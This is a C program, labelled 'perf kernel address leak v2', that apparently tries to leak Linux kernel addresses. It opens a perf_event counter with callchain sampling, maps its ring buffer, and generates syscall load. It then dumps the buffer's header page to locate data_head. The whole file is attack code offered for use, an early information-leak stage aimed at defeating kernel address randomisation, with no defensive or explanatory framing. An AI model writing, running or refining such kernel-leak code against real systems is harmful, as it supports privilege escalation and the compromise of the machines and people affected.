#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <fcntl.h>

struct perf_event_attr {
    unsigned int type;
    unsigned int size;
    unsigned long long config;
    unsigned long long sample_period;
    unsigned long long sample_type;
    unsigned long long read_format;
    unsigned long long flags;
    unsigned int wakeup_events;
    unsigned int bp_type;
    unsigned long long bp_addr;
    unsigned long long bp_len;
    unsigned long long branch_sample_type;
    unsigned long long sample_regs_user;
    unsigned long long sample_stack_user;
};

#define PERF_TYPE_SOFTWARE 1
#define PERF_COUNT_SW_TASK_CLOCK 1
#define PERF_SAMPLE_IP 1ULL
#define PERF_SAMPLE_CALLCHAIN 32ULL

static long perf_event_open(struct perf_event_attr *attr, pid_t pid,
                            int cpu, int group_fd, unsigned long flags) {
    return syscall(__NR_perf_event_open, attr, pid, cpu, group_fd, flags);
}

int main(void) {
    struct perf_event_attr pe;
    int page_size = 4096;
    int mmap_pages = 16;
    int mmap_size = (1 + mmap_pages) * page_size;

    printf("[*] perf kernel address leak v2\n");

    memset(&pe, 0, sizeof(pe));
    pe.type = PERF_TYPE_SOFTWARE;
    pe.size = sizeof(pe);
    pe.config = PERF_COUNT_SW_TASK_CLOCK;
    pe.sample_period = 100000; /* sample every 100000 events */
    pe.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_CALLCHAIN;
    pe.flags = (1ULL << 0); /* disabled */
    pe.wakeup_events = 1;

    int fd = perf_event_open(&pe, 0, -1, -1, 0);
    if (fd < 0) {
        perror("perf_event_open");
        return 1;
    }
    printf("[+] fd=%d\n", fd);

    void *buf = mmap(NULL, mmap_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    if (buf == MAP_FAILED) {
        perror("mmap");
        close(fd);
        return 1;
    }

    /* Dump first 256 bytes of mmap page to find data_head */
    printf("[*] Mmap page before enable:\n");
    unsigned int *uptr = (unsigned int *)buf;
    for (int i = 0; i < 64; i++) {
        if (uptr[i] != 0)
            printf("  [%3d] offset %3d (0x%02x): 0x%08x\n", i, i*4, i*4, uptr[i]);
    }

    /* Enable */
    ioctl(fd, 0x2400, 0);

    /* Generate load */
    for (int r = 0; r < 200; r++) {
        setuid(getuid());
        for (int i = 0; i < 200; i++) {
            int pfd = open("/proc/self/stat", O_RDONLY);
            if (pfd >= 0) {
                char tmp[256];
                read(pfd, tmp, sizeof(tmp));
                close(pfd);
            }
        }
    }

    /* Disable */
    ioctl(fd, 0x2401, 0);

    /* Dump mmap page after to find data_head */
    printf("\n[*] Mmap page after disable:\n");
    for (int i = 0; i < 64; i++) {
        if (uptr[i] != 0)
            printf("  [%3d] offset %3d (0x%02x): 0x%08x\n", i, i*4, i*4, uptr[i]);
    }

    /* Try common offsets for data_head */
    for (int off = 64; off <= 128; off += 8) {
        unsigned long long val = *(unsigned long long *)((char *)buf + off);
        if (val > 0 && val < 10000000) {
            printf("\n[*] Potential data_head at offset %d: %llu\n", off, val);
        }
    }

    munmap(buf, mmap_size);
    close(fd);
    return 0;
}
